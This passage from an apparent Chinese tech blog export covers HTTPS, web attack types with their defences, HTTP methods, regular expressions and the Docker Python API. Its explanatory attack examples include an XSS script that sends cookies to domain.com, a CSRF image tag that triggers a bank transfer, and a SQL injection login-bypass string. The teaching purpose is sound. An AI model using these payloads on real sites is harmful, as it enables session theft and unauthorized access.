Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。 优点：更为安全； 缺点：运算速度慢； 3. HTTPs 采用的加密方式HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。（下图中的 Session Key 就是对称密钥） 认证通过使用 证书 来对通信方进行认证。 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。 进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。 完整性保护SSL 提供报文摘要功能来进行完整性保护。 HTTP 也提供了 MD5 报文摘要功能，但是却不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生篡改。 HTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。 HTTPs 的缺点 因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高费用。 配置 HTTPsNginx 配置 HTTPS 服务器 七、Web 攻击技术跨站脚本攻击1. 概念跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。 例如有一个论坛网站，攻击者可以在上面发布以下内容： 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式： 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。 2. 危害 窃取用户的 Cookie 值 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 3. 防范手段（一）设置 Cookie 为 HttpOnly 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，在一定程度上可以防止 XSS 攻击窃取用户的 Cookie 信息。 （二）过滤特殊字符 许多语言都提供了对 HTML 的过滤： PHP 的 htmlentities() 或是 htmlspecialchars()。 Python 的 cgi.escape()。 Java 的 xssprotect (Open Source Library)。 Node.js 的 node-validator。 例如 htmlspecialchars() 可以将 &lt; 转义为 &amp;lt;，将 &gt; 转义为 &amp;gt;，从而避免 HTML 和 Jascript 代码的运行。 （三）富文本编辑器的处理 富文本编辑器允许用户输入 HTML 代码，就不能简单地将 &lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。 富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。 以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。 XSS 过滤在线测试 1234567891011121314151617181920212223242526&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;p class="text-center"&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&lt;form&gt; &lt;input type="text" name="q" value="test"&gt; &lt;button id="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&lt;script type="text/javascript"&gt;alert(/xss/);&lt;/script&gt; 1234567891011121314151617181920212223242526&lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&amp;lt;form&amp;gt; &amp;lt;input type="text" name="q" value="test"&amp;gt; &amp;lt;button id="submit"&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&amp;lt;script type="text/javascript"&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt; 跨站点请求伪造1. 概念跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 假如一家银行用以执行转账操作的 URL 地址如下： 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码： 1&lt;img src="http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman"&gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。 2. 防范手段（一）检查 Referer 字段 HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。 （二）添加校验 Token 由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。 也可以要求用户输入验证码来进行校验。 SQL 注入攻击1. 概念服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。 2. 攻击原理例如一个网站登录验证的 SQL 查询代码为： 1strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');" 如果填入以下内容： 12userName = "1' OR '1'='1";passWord = "1' OR '1'='1"; 那么 SQL 查询字符串为： 1strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');" 此时无需验证通过就能执行以下查询： 1strSQL = "SELECT * FROM users;" 3. 防范手段（一）使用参数化查询 以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以并且传入适当参数多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。 1234PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");stmt.setString(1, userid);stmt.setString(2, password);ResultSet rs = stmt.executeQuery(); （二）单引号转换 将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。 拒绝服务攻击拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。 维基百科：拒绝服务攻击 八、GET 和 POST 的区别作用GET 用于获取资源，而 POST 用于传输实体主体。 参数GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。 因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码，例如中文会转换为%E4%B8%AD%E6%96%87，而空格会转换为%20。POST 支持标准字符集。 安全安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。 GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。 安全的方法除了 GET 之外还有：HEAD、OPTIONS。 不安全的方法除了 POST 之外还有 PUT、DELETE。 幂等性幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。 GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1POST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 可缓存如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 XMLHttpRequest为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest： XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。而 GET 方法 Header 和 Data 会一起发送。 九、HTTP/1.0 与 HTTP/1.1 的区别 HTTP/1.1 默认是持久连接 HTTP/1.1 支持管线化处理 HTTP/1.1 支持虚拟主机 HTTP/1.1 新增状态码 100 HTTP/1.1 支持分块传输编码 HTTP/1.1 新增缓存处理指令 max-age 具体内容见上文 十、HTTP/2.0HTTP/1.x 缺陷 HTTP/1.x 实现简单是以牺牲应用性能为代价的： 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应标头，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。 二进制分帧层HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。 在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。 服务端推送HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。 首部压缩HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。 参考资料 上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014. MDN : HTTP HTTP/2 简介 htmlspecialchars How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement 浅谈 HTTP 中 Get 与 Post 的区别https://github.com/CyC2018/Interview-Notebook/blob/master/notes/%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3.md Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY &amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs Cookie 与 Session 的区别 COOKIE 和 SESSION 有什么区别 Cookie/Session 的机制与安全 HTTPS 证书原理 维基百科：跨站脚本 维基百科：SQL 注入攻击 维基百科：跨站点请求伪造 维基百科：拒绝服务攻击 What is the difference between a URI, a URL and a URN? XMLHttpRequest XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST? Symmetric vs. Asymmetric Encryption – What are differences? Web 性能优化与 HTTP/2 HTTP/2 简介]]></content>
      <categories>
        <category>系统运维</category>
        <category>Http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2Flinux_ops%2Fregexr%2F</url>
    <content type="text"><![CDATA[一、概述 二、匹配单个字符 三、匹配一组字符 四、使用元字符 五、重复匹配 六、位置匹配 七、使用子表达式 八、回溯引用 九、前后查找 十、嵌入条件 参考资料 一、概述正则表达式用于文本内容的查找和替换。 正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。 正则表达式在线工具 二、匹配单个字符正则表达式一般是区分大小写的，但是也有些实现是不区分。 . 可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符； \ 是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。 正则表达式 1nam. 匹配结果 My name is Zheng. 三、匹配一组字符[ ] 定义一个字符集合； 0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间只能用在 [ ] 之间。 - 元字符只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符； ^ 是取非操作，必须在 [ ] 字符集合中使用； 应用 匹配以 abc 为开头，并且最后一个字母不为数字的字符串： 正则表达式 1abc[^0-9] 匹配结果 abcd abc1 abc2 四、使用元字符匹配空白字符 元字符 说明 [\b] 回退（删除）一个字符 \f 换页符 \n 换行符 \r 回车符 \t 制表符 \v 垂直制表符 \r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n ；\r\n\r\n 可以匹配 Windows 下的空白行，因为它将匹配两个连续的行尾标签，而这正是两条记录之间的空白行； . 是元字符，前提是没有对它们进行转义；f 和 n 也是元字符，但是前提是对它们进行了转义。 匹配特定的字符类别1. 数字元字符 元字符 说明 \d 数字字符，等价于 [0-9] \D 非数字字符，等价于 [^0-9] 2. 字母数字元字符 元字符 说明 \w 大小写字母，下划线和数字，等价于 [a-zA-Z0-9_] \W 对 \w 取非 3. 空白字符元字符 元字符 说明 \s 任何一个空白字符，等价于 [\f\n\r\t\v] \S 对 \s 取非 \x 匹配十六进制字符，\0 匹配八进制，例如 \x0A 对应 ASCII 字符 10 ，等价于 \n，也就是它会匹配 \n 。 五、重复匹配+ 匹配 1 个或者多个字符， * 匹配 0 个或者多个，? 匹配 0 个或者 1 个。 应用 匹配邮箱地址。 正则表达式 1[\w.]+@\w+\.\w+ [\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符； 匹配结果 abc.def@qq.com 为了可读性，常常把转义的字符放到字符集合 [ ] 中，但是含义是相同的。 12[\w.]+@\w+\.\w+[\w.]+@[\w]+\.[\w]+ {n} 匹配 n 个字符，{m, n} 匹配 m~n 个字符，{m,} 至少匹配 m 个字符； * 和 + 都是贪婪型元字符，会匹配最多的内容，在元字符后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m, n}? 。 正则表达式 1a.+c 由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。 匹配结果 abcabcabc 六、位置匹配单词边界\b 可以匹配一个单词的边界，边界是指位于 \w 和 \W 之间的位置；\B 匹配一个不是单词边界的位置。 \b 只匹配位置，不匹配字符，因此 \babc\b 匹配出来的结果为 3 个字符。 字符串边界^ 匹配整个字符串的开头，$ 匹配结尾。 ^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。 分行匹配模式（multiline）下，换行被当做字符串的边界。 应用 匹配代码中以 // 开始的注释行 正则表达式 1^\s*\/\/.*$ 匹配结果 public void fun() { &nbsp;&nbsp;&nbsp;&nbsp; // 注释 1 &nbsp;&nbsp;&nbsp;&nbsp; int a = 1; &nbsp;&nbsp;&nbsp;&nbsp; int b = 2; &nbsp;&nbsp;&nbsp;&nbsp; // 注释 2 &nbsp;&nbsp;&nbsp;&nbsp; int c = a + b; } 七、使用子表达式使用 ( ) 定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。 子表达式可以嵌套，但是嵌套层次过深会变得很难理解。 正则表达式 1(ab)&#123;2,&#125; 匹配结果 ababab | 是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。 正则表达式 1(19|20)\d&#123;2&#125; 匹配结果 1900 2010 1020 应用 匹配 IP 地址。IP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的： 一位数字 不以 0 开头的两位数字 1 开头的三位数 2 开头，第 2 位是 0-4 的三位数 25 开头，第 3 位是 0-5 的三位数 正则表达式 1((25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d))\.)&#123;3&#125;(25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d)) 匹配结果 192.168.0.1 00.00.00.00 555.555.555.555 八、回溯引用回溯引用使用 \n 来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。 应用 匹配 HTML 中合法的标题元素。 正则表达式 \1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。 1&lt;(h[1-6])&gt;\w*?&lt;\/\1&gt; 匹配结果 &lt;h1&gt;x&lt;/h1&gt; &lt;h2&gt;x&lt;/h2&gt; &lt;h3&gt;x&lt;/h1&gt; 替换需要用到两个正则表达式。 应用 修改电话号码格式。 文本 313-555-1234 查找正则表达式 1(\d&#123;3&#125;)(-)(\d&#123;3&#125;)(-)(\d&#123;4&#125;) 替换正则表达式 在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。 1($1) $3-$5 结果 (313) 555-1234 大小写转换 元字符 说明 \l 把下个字符转换为小写 \u 把下个字符转换为大写 \L 把\L 和\E 之间的字符全部转换为小写 \U 把\U 和\E 之间的字符全部转换为大写 \E 结束\L 或者\U 应用 把文本的第二个和第三个字符转换为大写。 文本 abcd 查找 1(\w)(\w&#123;2&#125;)(\w) 替换 1$1\U$2\E$3 结果 aBCd 九、前后查找前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。向前查找用 ?= 来定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?&lt;= 定义（注: javaScript 不支持向后匹配, java 对其支持也不完善）。 应用 查找出邮件地址 @ 字符前面的部分。 正则表达式 1\w+(?=@) 结果 abc @qq.com 对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。 十、嵌入条件回溯引用条件条件判断为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。 正则表达式 子表达式 (\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。 1(\()?abc(?(1)\)) 结果 (abc) abc (abc 前后查找条件条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。 正则表达式 ?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \d{5} ，才继续匹配 -\d{4} 。 1\d&#123;5&#125;(?(?=-)-\d&#123;4&#125;) 结果 11111 22222- 33333-4444 参考资料 BenForta. 正则表达式必知必会 [M]. 人民邮电出版社, 2007.]]></content>
      <categories>
        <category>编程技能</category>
        <category>Regexr</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker Python Api 操作]]></title>
    <url>%2Fdocker%2Fdocker_python-api%2F</url>
    <content type="text"><![CDATA[Docker-client for python简易安装1pip install docker-py 客户端初始化的三种方法123456import dockerdocker.api()docker.APIClient()docker.client()docker.DockerClient() #其实也是docker.client()的一个子集docker.from_env() #其实就是docker.client()的一个子集 简单测试查看docker版本号等同于执行docker version命令 123456789101112131415161718192021222324252627282930$ yum -y install ipython$ ipythonIn [1]: import dockerIn [2]: client = docker.APIClient(base_url='unix://var/run/docker.sock',version='auto',timeout=5)In [3]: client.version()Out[3]: &#123;u'ApiVersion': u'1.35', u'Arch': u'amd64', u'BuildTime': u'2017-12-27T20:12:46.000000000+00:00', u'Components': [&#123;u'Details': &#123;u'ApiVersion': u'1.35', u'Arch': u'amd64', u'BuildTime': u'2017-12-27T20:12:46.000000000+00:00', u'Experimental': u'false', u'GitCommit': u'c97c6d6', u'GoVersion': u'go1.9.2', u'KernelVersion': u'4.11.1-1.el7.elrepo.x86_64', u'MinAPIVersion': u'1.12', u'Os': u'linux'&#125;, u'Name': u'Engine', u'Version': u'17.12.0-ce'&#125;], u'GitCommit': u'c97c6d6', u'GoVersion': u'go1.9.2', u'KernelVersion': u'4.11.1-1.el7.elrepo.x86_64', u'MinAPIVersion': u'1.12', u'Os': u'linux', u'Platform': &#123;u'Name': u''&#125;, u'Version': u'17.12.0-ce'&#125; docker.APIClient 中部分相关参数说明 1234Args: base_url (str): 指定链接路径，可以通过socket或者tcp方式链接``unix:///var/run/docker.sock`` or ``tcp://127.0.0.1:1234`` version (str): 指定API使用的版本(docker=2.0.0默认的api版本是1.24,最低支持1.21,docker1.9+的api是1.21),因此在使用python的docker模块时一定要注意docker的api以及docker模块的api是否兼容。当然如果设置为 ``auto`` 会去自动检测server的版本 timeout (int): 使用API调用的默认超时时间，默认单位为秒 用docker python api的方式查看镜像等同于执行docker images命令 123456789101112131415161718192021222324252627282930$ ipythonIn [1]: import dockerIn [2]: client = docker.APIClient(base_url='unix://var/run/docker.sock',version='auto',timeout=5)In [6]: client.images()Out[6]: [&#123;u'Containers': -1, u'Created': 1496683994, u'Id': u'sha256:3bee3060bfc81c061ce7069df35ce090593bda584d4ef464bc0f38086c11371d', u'Labels': &#123;u'build-date': u'20170605', u'license': u'GPLv2', u'name': u'CentOS Base Image', u'vendor': u'CentOS'&#125;, u'ParentId': u'', u'RepoDigests': [u'centos@sha256:9173758d35da834e8320f57093290b3bdcefe7fc9f4855a1ed4012b7bd940273'], u'RepoTags': [u'centos:7'], u'SharedSize': -1, u'Size': 192555856, u'VirtualSize': 192555856&#125;, &#123;u'Containers': -1, u'Created': 1484706726, u'Id': u'sha256:36b1e23becabc0b27c5787712dce019982c048665fd9e7e6cb032a46bcac510d', u'Labels': &#123;&#125;, u'ParentId': u'', u'RepoDigests': [u'swarm@sha256:815fc8fd4617d866e1256999c2c0a55cc8f377f3dade26c3edde3f0543a70c04'], u'RepoTags': [u'swarm:1.2.6'], u'SharedSize': -1, u'Size': 15852351, u'VirtualSize': 15852351&#125;] 用docker python api的方式pull拉取一个镜像123456$ ipythonIn [1]: import dockerIn [2]: client = docker.APIClient(base_url='unix://var/run/docker.sock',version='auto',timeout=5)In [7]: client.pull('centos:7') 通过docker python api的方式运行一个容器1234567891011$ ipythonIn [1]: import dockerIn [2]: client = docker.APIClient(base_url='unix://var/run/docker.sock',version='auto',timeout=5)In [8]: client = docker.from_env()In [9]: client.containers.run(image="centos:7",stdin_open=True,tty=True,command="/bin/bash",name="test_docker_python-api",detach=True)Out[9]: &lt;Container: e2cd190605&gt;In [10]: client.containers.list() # 列出主机上当前运行的容器Out[10]: [&lt;Container: e2cd190605&gt;, &lt;Container: 5ef3e3e500&gt;] 在终端执行docker ps -a命令我们会看到刚刚新建的容器 123$ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe2cd19060581 centos:7 "/bin/bash" 3 seconds ago Up 2 seconds test_docker_python-api 通过docker python api的方式对一个容docker器执行一些操作12345678910$ ipythonIn [1]: import dockerIn [2]: client = docker.APIClient(base_url='unix://var/run/docker.sock',version='auto',timeout=5)In [8]: client = docker.from_env()In [11]: container = client.containers.get('e2cd190605') In [12]: container.logs() #查看容器输出到控制台的相关日志In [13]: container.stop() #停止容器ID为e2cd190605的容器In [14]: container.remove() #删除这个容器..... 关于docker python api的更多详细用法，可参看学习下官方文档： https://github.com/docker/docker-py http://docker-py.readthedocs.io/en/stable/index.html https://docs.docker.com/develop/sdk/ 用python编写一个Docker容器监控脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250#!/usr/bin/env python## -* - coding: UTF-8 -* -import dockerimport jsonimport sysimport redef usage(): """The output configuration file contents.Usage: zabbix_module_docker.py [docker.version] [docker.discovery] [docker.up] [docker.mem] [docker.cpu] [docker.stats] [docker.run]Description docker.version The version of docker dameon. docker.discovery List containers. Similar to the `docker ps -a` command. docker.up The status of one per container. docker.mem The memory usage of one per container. docker.cpu The cpu usage of one per container. docker.stats The network stats of one per container. docker.exec Execute command in docker container.for example: zabbix_module_docker.py docker.version zabbix_module_docker.py docker.up test_container zabbix_module_docker.py docker.cpu test_container system zabbix_module_docker.py docker.stats test_container tx_packets zabbix_module_docker.py docker.exec test_container fileopen zabbix_module_docker.py docker.run centos:7 /bin/bash test_container"""class DockerService(object): def __init__(self): self.url = 'unix://var/run/docker.sock' self.docker_running = False self.client = docker.APIClient(base_url=self.url, timeout=3, num_pools=20) def docker_version(self): return self.client.version()['Version'] def docker_discovery(self): try: containerList = self.client.containers(all=True) self.docker_running = True # Apologies for the broad exception, it just works here. except Exception: self.docker_running = False if self.docker_running: # print 'status ok succeeded in obtaining docker container list # return containerList if len(containerList) == 0: print ("&#123;") print ("\t\"data\":[") print ("\t]") print ("&#125;") sys.exit(0) print ("&#123;") print ("\t\"data\":[\n") for container in containerList[0:len(containerList)-1]: print ("\t&#123;") print ("\t\t\"&#123;#CONTAINERNAME&#125;\":\""+str(container['Names'][0]).split("/")[1]+"\""+",") print ("\t\t\"&#123;#CONTAINERID&#125;\":\""+str(container['Id'])+"\"") print ("\t&#125;,")true print ("\t&#123;") print ("\t\t\"&#123;#CONTAINERNAME&#125;\":\""+str(containerList[-1]['Names'][0]).split("/")[1]+"\""+",") print ("\t\t\"&#123;#CONTAINERID&#125;\":\""+str(containerList[-1]['Id'])+"\"") print ("\t&#125;") print ("\n\t]") print ("&#125;") def docker_up(self, containerName): try: containerList = self.client.containers(all=True) self.docker_running = True except Exception: self.docker_running = False if self.docker_running: for container in containerList: if containerName == str(container['Names'][0]).split("/")[1]: if container['State'] == "running": return 1 else: return 0 def docker_stats(self, container): try: stats = self.client.stats(container, True) except Exception: self.docker_running = False if self.docker_up(container) == 1: for stat in stats: s = json.loads(json.dumps(stat)) return s else: print('0') sys.exit(1) def docker_inspect(self, container): try: inspect = self.client.inspect_container(container) except Exception: self.docker_running = False if self.docker_up(container) == 1: s = 